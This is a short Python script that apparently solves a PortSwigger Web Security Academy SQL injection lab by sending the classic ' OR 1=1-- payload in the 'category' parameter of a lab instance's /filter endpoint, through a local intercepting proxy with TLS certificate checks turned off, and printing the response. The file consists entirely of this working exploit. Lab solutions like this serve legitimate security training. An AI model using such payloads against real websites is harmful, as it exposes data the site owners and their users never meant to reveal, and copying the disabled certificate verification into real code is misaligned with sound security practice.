# https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

import requests
requests.packages.urllib3.disable_warnings()

url = "https://ac3d1f691f12a3d2807e491900590042.web-security-academy.net/filter"
proxy = "127.0.0.1:8080"
proxies = {"https": proxy, "http": proxy}
verify = False

q = "' OR 1=1-- "
params = {"category": q}

r = requests.get(url, proxies=proxies, params=params, verify=verify)
print(r.text)